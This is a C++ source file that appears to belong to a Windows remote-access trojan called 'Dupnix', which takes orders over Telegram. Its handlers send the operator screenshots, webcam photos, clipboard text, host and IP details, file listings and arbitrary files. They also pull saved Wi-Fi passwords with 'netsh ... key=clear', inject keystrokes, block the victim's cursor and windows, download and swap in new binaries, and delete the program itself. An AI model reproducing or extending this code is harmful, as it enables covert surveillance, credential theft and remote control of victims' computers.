#include "commands.h"

#include <string>
#include <fstream>
#include <iostream>
#include <Windows.h>
#include <chrono>
#include <thread>
#include <vector>

#include <opencv2/opencv.hpp>
#include <nlohmann/json.hpp>

#include "parse.h"
#include "execute.h"
#include "telegram.h"
#include "tools.h"
#include "globals.h"

using json = nlohmann::json;

void getStatus(std::string) {
    std::string status;

    status = "uptime: " + tools::info::getUptime() + '\n';
    status += "exe_name: " + tools::info::getExeName() + '\n';
    status += "host_name: " + tools::info::getHostname() + '\n';
    status += "public_ip: " + tools::info::getPublicIp() + '\n';
    status += "local_ip: \n";

    auto local_ip = tools::info::getLocalIp();
    for (auto& e : local_ip) {
        status += "  " + e.first + ": " + e.second + "\n";
    }
    status += "admin_rights: " + std::to_string(tools::info::checkAdminRights()) + '\n';
    status += "exe_path: " + tools::info::getDupnixPath() + '\n';
    status += "current_volume: " + std::to_string(tools::ChangeVolume()) + '\n';
    status += "cursor_position: " + tools::info::getCursorPos() + '\n';
    status += "list_of_disks: " + tools::info::DiskList() + '\n';

    status += "\nversion: " + VERSION + '\n';

    telegram::SendText(status);
}

void setID(std::string new_ID) {
    ID = new_ID;

    json change;
    change["id"] = new_ID;
    tools::changeCfg(change);

    std::cout << "New ID: " << new_ID << std::endl;
}

void setVolume(std::string value) {
    if (value.empty()) {
        telegram::SendText("Current volume: " + tools::ChangeVolume());
        return;
    }

    int what_to_do = 1;  // 1 = set, 2 = increase, 3 = decrease
    if (value[0] == '+')
        what_to_do = 2;
    if (value[0] == '-')
        what_to_do = 3;

    if (value[0] == '+' || value[0] == '-')
        value.erase(0, 1);

    if (value.find_first_not_of("0123456789") != std::string::npos) {
        telegram::SendText("invalid syntax");
        return;
    }

    int volume = atoi(value.c_str());

    if (what_to_do == 2)
        volume += tools::ChangeVolume();
    if (what_to_do == 3)
        volume = tools::ChangeVolume() - volume;

    if (volume < 0)
        volume = 0;
    if (volume > 100)
        volume = 100;


    tools::ChangeVolume(static_cast<float>(volume * 0.01), 1);
    telegram::SendText("current volume: " + std::to_string(volume));
}

void Screenshot(std::string) {
    HWND hwnd = GetDesktopWindow();
    cv::Mat src = tools::captureScreenMat(hwnd);

    std::string ss_path = "ss.jpg";

    // save img
    cv::imwrite(ss_path, src);
    telegram::SendFile(ss_path);
    tools::remove(ss_path);
}

void monitorOff(std::string) {
    SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
}

void monitorOn(std::string) {
    SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
}

void SetCursor(std::string cords) {
    std::string x, y;
    for (int i = 0; i < cords.size(); i++) {
        static bool change(false);  // variable that say's if are adding now to x or y
        if (cords[i] == ',' || cords[i] == ' ') {
            change = true;
            continue;
        }

        if (!change)
            x += cords[i];
        if (change)
            y += cords[i];
    }

    if (x.find_first_not_of("0123456789") != std::string::npos) {
        telegram::SendText("invalid syntax");
        return;
    }

    if (y.find_first_not_of("0123456789") != std::string::npos) {
        telegram::SendText("invalid syntax");
        return;
    }

    SetCursorPos(atoi(x.c_str()), atoi(y.c_str()));
}

// executes some command with delay
void Delay(std::string delay) {
    std::string seconds;
    std::string function;
    std::string parameters;

    for (int i = 0; i < delay.size(); i++) {
        static int state(0);

        if (delay[i] == ' ') {
            state++;
            continue;
        }

        if (state == 0)
            seconds += delay[i];
        if (state == 1)
            function += delay[i];
        if (state > 1)
            parameters += delay[i];
    }

    if (seconds.find_first_not_of("0123456789") != std::string::npos) {
        telegram::SendText("invalid syntax");
        return;
    }

    Sleep(atoi(seconds.c_str()) * 1000);

    execute::execute({ ID, function, parameters });
}

// sets cursor position to 0,0 for given time
void BlockCursor(std::string time) {
    if (time.find_first_not_of("0123456789") != std::string::npos) {
        telegram::SendText("invalid syntax");
        return;
    }

    int duration = atoi(time.c_str());

    auto start = std::chrono::system_clock::now();
    while (true) {
        SetCursorPos(0, 0);
        Sleep(5);

        auto now = std::chrono::system_clock::now();

        std::chrono::duration<double> diff = now - start;

        if (diff.count() > duration)
            break;
    }
}

void BlockClipboard(std::string yes_or_not) {
    if (yes_or_not == "true")
        OpenClipboard(nullptr);
    else
        CloseClipboard();
}

void Press(std::string to_press) {
    for (auto& e : to_press) {
        if (e < 0 || e > 255)
            continue;

        bool low = false;
        if (islower(e) || isdigit(e))
            low = true;

        std::string low_chars = "`-=[];',./";
        for (auto& e1 : low_chars) {
            if (e == e1) {
                low = true;
                break;
            }
        }

        if (low)
            tools::press_key(e);
        else
            tools::press_key(e, 1);
    }
}

void hotkeys(std::string hotkey) {
    hotkey += "+";  // needa add '+' because pressing key triggers when it meets it
    std::string buff;  // string which contains temporary substring
    // pressing keys
    for (int i = 0; i < hotkey.size(); i++) {
        if (hotkey[i] == '+') {
            // it looks like a shit but idk other way
            if (buff.size() == 1 && buff[0] >= 97 && buff[0] <= 122)
                keybd_event(VkKeyScan(buff[0]), 1, 0, 0);
            else if (buff == "esc") tools::pressSpecialKey(VK_ESCAPE, 0);
            else if (buff == "tab") tools::pressSpecialKey(VK_TAB, 0);
            else if (buff == "capslock") tools::pressSpecialKey(VK_CAPITAL, 0);
            else if (buff == "shift") tools::pressSpecialKey(VK_SHIFT, 0);
            else if (buff == "ctrl") tools::pressSpecialKey(VK_CONTROL, 0);
            else if (buff == "win") tools::pressSpecialKey(VK_LWIN, 0);
            else if (buff == "alt") tools::pressSpecialKey(VK_MENU, 0);
            else if (buff == "ralt") tools::pressSpecialKey(VK_RMENU, 0);
            else if (buff == "space") tools::pressSpecialKey(VK_SPACE, 0);
            else if (buff == "enter") tools::pressSpecialKey(VK_RETURN, 0);
            else if (buff == "backspace") tools::pressSpecialKey(VK_BACK, 0);
            else if (buff == "del") tools::pressSpecialKey(VK_DELETE, 0);
            else if (buff == "f1") tools::pressSpecialKey(VK_F1, 0);
            else if (buff == "f2") tools::pressSpecialKey(VK_F2, 0);
            else if (buff == "f3") tools::pressSpecialKey(VK_F3, 0);
            else if (buff == "f4") tools::pressSpecialKey(VK_F4, 0);
            else if (buff == "f5") tools::pressSpecialKey(VK_F5, 0);
            else if (buff == "f6") tools::pressSpecialKey(VK_F6, 0);
            else if (buff == "f7") tools::pressSpecialKey(VK_F7, 0);
            else if (buff == "f8") tools::pressSpecialKey(VK_F8, 0);
            else if (buff == "f9") tools::pressSpecialKey(VK_F9, 0);
            else if (buff == "f10") tools::pressSpecialKey(VK_F10, 0);
            else if (buff == "f11") tools::pressSpecialKey(VK_F11, 0);
            else if (buff == "f12") tools::pressSpecialKey(VK_F12, 0);
            else if (buff == "ins") tools::pressSpecialKey(VK_INSERT, 0);
            else if (buff == "home") tools::pressSpecialKey(VK_HOME, 0);
            else if (buff == "end") tools::pressSpecialKey(VK_END, 0);
            else if (buff == "pgdn") tools::pressSpecialKey(VK_NEXT, 0);
            else if (buff == "pgup") tools::pressSpecialKey(VK_PRIOR, 0);
            else if (buff == "uparrow") tools::pressSpecialKey(VK_UP, 0);
            else if (buff == "downarrow") tools::pressSpecialKey(VK_DOWN, 0);
            else if (buff == "leftarrow") tools::pressSpecialKey(VK_LEFT, 0);
            else if (buff == "rightarrow") tools::pressSpecialKey(VK_RIGHT, 0);
            else if (buff == "lmouse") tools::pressSpecialKey(VK_LBUTTON, 0);;

            buff.clear();
        }
        else buff += hotkey[i];
    }
    Sleep(10);

    // unpressing keys
    buff.clear();
    for (int i = 0; i < hotkey.size(); i++) {
        if (hotkey[i] == '+') {
            // it looks like a shit but idk other way
            if (buff.size() == 1 && buff[0] >= 97 && buff[0] <= 122)
                keybd_event(VkKeyScan(buff[0]), 1, KEYEVENTF_KEYUP, 0);
            else if (buff == "esc") tools::pressSpecialKey(VK_ESCAPE, 1);
            else if (buff == "tab") tools::pressSpecialKey(VK_TAB, 1);
            else if (buff == "capslock") tools::pressSpecialKey(VK_CAPITAL, 1);
            else if (buff == "shift") tools::pressSpecialKey(VK_SHIFT, 1);
            else if (buff == "ctrl") tools::pressSpecialKey(VK_CONTROL, 1);
            else if (buff == "win") tools::pressSpecialKey(VK_LWIN, 1);
            else if (buff == "alt") tools::pressSpecialKey(VK_MENU, 1);
            else if (buff == "ralt") tools::pressSpecialKey(VK_RMENU, 1);
            else if (buff == "space") tools::pressSpecialKey(VK_SPACE, 1);
            else if (buff == "enter") tools::pressSpecialKey(VK_RETURN, 1);
            else if (buff == "backspace") tools::pressSpecialKey(VK_BACK, 1);
            else if (buff == "del") tools::pressSpecialKey(VK_DELETE, 1);
            else if (buff == "f1") tools::pressSpecialKey(VK_F1, 1);
            else if (buff == "f2") tools::pressSpecialKey(VK_F2, 1);
            else if (buff == "f3") tools::pressSpecialKey(VK_F3, 1);
            else if (buff == "f4") tools::pressSpecialKey(VK_F4, 1);
            else if (buff == "f5") tools::pressSpecialKey(VK_F5, 1);
            else if (buff == "f6") tools::pressSpecialKey(VK_F6, 1);
            else if (buff == "f7") tools::pressSpecialKey(VK_F7, 1);
            else if (buff == "f8") tools::pressSpecialKey(VK_F8, 1);
            else if (buff == "f9") tools::pressSpecialKey(VK_F9, 1);
            else if (buff == "f10") tools::pressSpecialKey(VK_F10, 1);
            else if (buff == "f11") tools::pressSpecialKey(VK_F11, 1);
            else if (buff == "f12") tools::pressSpecialKey(VK_F12, 1);
            else if (buff == "ins") tools::pressSpecialKey(VK_INSERT, 1);
            else if (buff == "home") tools::pressSpecialKey(VK_HOME, 1);
            else if (buff == "end") tools::pressSpecialKey(VK_END, 1);
            else if (buff == "pgdn") tools::pressSpecialKey(VK_NEXT, 1);
            else if (buff == "pgup") tools::pressSpecialKey(VK_PRIOR, 1);
            else if (buff == "uparrow") tools::pressSpecialKey(VK_UP, 1);
            else if (buff == "downarrow") tools::pressSpecialKey(VK_DOWN, 1);
            else if (buff == "leftarrow") tools::pressSpecialKey(VK_LEFT, 1);
            else if (buff == "rightarrow") tools::pressSpecialKey(VK_RIGHT, 1);
            else if (buff == "lmouse") tools::pressSpecialKey(VK_LBUTTON, 1);

            buff.clear();
        }
        else buff += hotkey[i];
    }
}

void SendClipboard(std::string) {
    HANDLE clip = 0;
    OpenClipboard(NULL);

    if (IsClipboardFormatAvailable(CF_TEXT))
        clip = GetClipboardData(CF_TEXT);
    else if (IsClipboardFormatAvailable(CF_UNICODETEXT))
        clip = GetClipboardData(CF_UNICODETEXT);
  
    CloseClipboard();

    char* buff = reinterpret_cast<char*>(clip);
    std::string text;
    if (buff)
        text = buff;

    telegram::SendText(text);
}

void Autodestruction(std::string) {
    tools::remove(DATA_FILENAME);
    std::ofstream f;
    std::string temp_filename = "jd.bat";
    f.open(temp_filename);

    f << "taskkill /im \"" + tools::info::getExeName() + "\" /t /f\n";
    f << "del \"" + tools::info::getExeName() << "\"\n";
    f << "del \"" + temp_filename << "\"\n";
    f << "exit\n";
    f.close();
    system("start /min jd.bat");
}

// some legacy code from stackoverflow
void WriteToClipboard(std::string to_write) {
    HWND hwnd = GetDesktopWindow();
    OpenClipboard(hwnd);
    EmptyClipboard();
    HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, to_write.size() + 1);
    if (!hg) {
        CloseClipboard();
        return;
    }
    memcpy(GlobalLock(hg), to_write.c_str(), to_write.size() + 1);
    GlobalUnlock(hg);
    SetClipboardData(CF_TEXT, hg);
    CloseClipboard();
    GlobalFree(hg);
}

void ProcessList(std::string) {
    std::string s = tools::info::cmdOutput("tasklist");
    std::string list = "";

    int pos = s.find(".exe");
    while (pos != std::string::npos) {
        std::string reversed = "exe.";
        int i = pos;
        while (s[i] != '\n') {
            i--;
            reversed += s[i];
        }

        std::reverse(reversed.begin(), reversed.end());
        list += reversed;
        s.erase(pos - abs(i - pos), (pos - i) + 4);
        pos = s.find(".exe");
    }
    telegram::SendText(list);
}

void IsFileExists(std::string path) {
    telegram::SendText("File: " + path + (tools::info::filExists(path) ? " exits" : " not exits"));
}

void WebcamView(std::string) {
    cv::VideoCapture cap(0);

    // Get the frame
    cv::Mat save_img; cap >> save_img;

    if (save_img.empty()) {
        telegram::SendText("Something is wrong with the webcam, could not get frame.");
        return;
    }
    // Save the frame into a file
    imwrite("wcm.jpg", save_img);  // A JPG FILE IS BEING SAVED
    std::string path = tools::info::getDupnixPath() + "wcm.jpg";

    telegram::SendPhoto(path);
    tools::remove(path);
}

// parses powershell command
void RunningApps(std::string) {
    telegram::SendText(tools::info::cmdOutput("powershell \"gps | where{ $_.MainWindowHandle -ne 0 } | select ProcessName").substr(42, TELEGRAM_MAX));
}

void ListOfFiles(std::string path) {
    if (!tools::info::isPath(path)) {
        telegram::SendText("Path doesn't exists or it's a file");
        return;
    }

    std::string output = "";
    for (const auto& file : std::filesystem::directory_iterator(path)) {
        output += file.path().generic_string().substr(path.size() + (path[path.size() - 1] == '/' || path[path.size() - 1] == '\\' ? 0 : 1), 256);

        if (file.is_directory())
            output += "/";

        output += '\n';
    }
    telegram::SendText(output);
}

// legacy code from old project, may look like a piece of shit but it works (i mean i think it works)
void WifiList(std::string) {
    std::vector<std::string> wifi;

    std::string parse(tools::info::cmdOutput("netsh wlan show profile"));
    int pos = parse.find("All User Profile");

    while (pos != std::string::npos) {
        std::string wifi_name = "";
        int pos2 = pos;
        pos = parse.find("All User Profile");

        for (int i = pos2 + 23; i < parse.size(); i++) {
            if (parse[i] == '\n')
                break;
            wifi_name += parse[i];
        }

        parse.erase(0, pos + 23);
        pos = parse.find("All User Profile");
        wifi.push_back(wifi_name);
    }
    std::string output = "";
    for (auto& i : wifi) {
        output += i + " : ";
        std::string s = "netsh wlan show profile " + i + " key=clear";
        s = tools::info::cmdOutput(s.c_str());

        int pos = s.find("Key Content");
        if (pos != std::string::npos) {
            for (int i = pos + 25; i < s.size(); i++) {
                if (s[i] == '\n')
                    break;
                output += s[i];
            }
        }
        output += '\n';
    }
    telegram::SendText(output);
}


bool closing_foreground = false;

void CloseForeground() {
    HWND Wind;
    while (closing_foreground) {
        Wind = GetForegroundWindow();
        ShowWindow(Wind, false);
        Sleep(10);
    }
    return;
}

std::thread t1;

void TurnCloseForeground(std::string turn) {
    if (turn == "true") {
        closing_foreground = true;
        t1 = std::thread(CloseForeground);
    } else {
        closing_foreground = false;
        t1.join();
    }
}

void ChangeCfg(std::string change) {
    try {
        tools::changeCfg(nlohmann::json::parse(change));
    }
    catch (...) {
        telegram::SendText("Wrong Syntax!");
    }
}

void UpdateDupnix(std::string link) {
    if (!tools::DownloadFile(link, "temp")) {
        telegram::SendText("Can't Download!");
        return;
    }
    std::ofstream update("a.bat");
    update << "TASKKILL /F /IM \"" << tools::info::getExeName() << "\"\n"
        << "del /f \"" << tools::info::getExeName() << "\"\n"
        << "move temp \"" << tools::info::getExeName() << "\"\n"
        << "start " << tools::info::getExeName() << std::endl
        << "exit";

    update.close();

    system("start /min a.bat");
}

void DownloadFile(std::string link) {
    int last_slash_pos = 0;
    for (int i = 0; i < link.size(); i++) {
        if (link[i] == '/')
            last_slash_pos = i;
    }

    std::string file_name = link.substr(last_slash_pos + 1, link.size());
    if (!tools::DownloadFile(link, file_name)) {
        telegram::SendText("Can't Download!");
        return;
    }

    telegram::SendText("Downloaded.");
}

void SendFile(std::string path) {
    if (!telegram::SendFile(path))
        telegram::SendText("Couldn't send!");
}
